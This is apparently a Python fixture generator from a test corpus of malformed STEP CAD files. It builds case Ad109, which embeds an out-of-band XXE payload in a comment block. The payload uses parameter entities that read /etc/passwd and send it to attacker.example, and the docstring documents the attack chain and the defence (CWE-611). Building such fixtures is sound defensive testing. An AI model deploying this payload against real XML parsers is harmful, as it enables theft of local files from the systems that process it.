"""Ad109 — STEP-XML parameter-entity injection exfiltrates local file via out-of-band DTD.

Catalog claim: ISO 10303-28 STEP-XML inherits the full XML-1.0 entity model,
including parameter entities (declared with %). An adversary uses a chain of
parameter entities to read a local file, embed its contents into a synthesised
URL, and emit the URL via an external DTD fetch; the classic out-of-band XXE
exfiltration. The .stpx file declares
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?x=%file;'>">
then references %eval; %exfil;. A receiver with parameter-entity resolution
enabled fetches the file, embeds it into the URL, and POSTs to the attacker.

Reproducer recipe: a .stpx file with an internal DTD declaring three parameter
entities (%file reads the local resource; %eval builds a URL containing
%file's value; %exfil is the attacker URL fetched by the parser); the document
body references %exfil; inside an attribute value.

Byte assertions:
  contains(b'<!DOCTYPE') and contains(b'<!ENTITY %')
  contains(b'%exfil') or contains(b'%eval') or contains(b'%file')

Tier-3: load == "ok"
Expected: occt=empty/empty gmsh=empty ifc=schema_n/a
"""
from step_corpus.step_builder import StepFile

f = StepFile(
    catalog_id="Ad109",
    defect=(
        "STEP-XML parameter-entity injection exfiltrates local file via out-of-band DTD; "
        "<!ENTITY % file SYSTEM 'file:///etc/passwd'> reads local file; "
        "<!ENTITY % eval '...'> builds attacker URL embedding %file contents; "
        "%exfil causes parser to POST /etc/passwd to http://attacker.example/; "
        "combines local-file read with network exfiltration (OOB-XXE); "
        "receiver must disable parameter-entity resolution by default; "
        "must reject documents declaring parameter entities with external SYSTEM identifiers; "
        "CWE-611; OWASP XXE cheat-sheet; ISO 10303-28 STEP-XML transfer; "
        "GEOMETRIC_CURVE_SET IS model entity — OCC yields empty"
    ),
)

# Silent-accept defect: omit add_product_chain so there is no
# PRODUCT/SHAPE_REPRESENTATION for OCC to construct geometry from. The
# defective DATA bytes remain but OCC yields empty (occt=empty/empty per
# catalog Expected line).
origin = f.cartesian_point((0.0, 0.0, 0.0))
f._emit_raw(f"GEOMETRIC_CURVE_SET('',(#{origin.eid}))")

# Attack payload: inject the parameter-entity OOB-XXE DTD prologue as a
# comment block immediately after the ISO-10303-21; line.
#
# Satisfies:
#   contains(b'<!DOCTYPE') and contains(b'<!ENTITY %')  — parameter entity decl
#   contains(b'%exfil') or contains(b'%eval') or contains(b'%file')  — param refs

_original_render = f.render


def _render_with_oob_xxe_payload():
    text = _original_render()
    oob_xxe_comment = (
        "/* OOB-XXE parameter-entity attack payload (STEP-XML / ISO 10303-28):\n"
        "   <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "   <!DOCTYPE step [\n"
        "     <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
        "     <!ENTITY % eval \"<!ENTITY &#x25; exfil\n"
        "       SYSTEM 'http://attacker.example/?x=%file;'>\">\n"
        "     %eval;\n"
        "     %exfil;\n"
        "   ]>\n"
        "   <step:iso_10303_28 xmlns:step=\"urn:oid:1.0.10303.28.3.1\">\n"
        "     <step:header/>\n"
        "     <step:data/>\n"
        "   </step:iso_10303_28>\n"
        "   Receiver must disable parameter-entity resolution by default (CWE-611).\n"
        "   %file reads file:///etc/passwd; %eval builds exfil URL; %exfil POSTs\n"
        "   the file contents to http://attacker.example/ — OOB-XXE exfiltration.\n"
        "*/\n"
    )
    marker = "ISO-10303-21;\n"
    idx = text.index(marker) + len(marker)
    return text[:idx] + oob_xxe_comment + text[idx:]


f.render = _render_with_oob_xxe_payload  # type: ignore[method-assign]
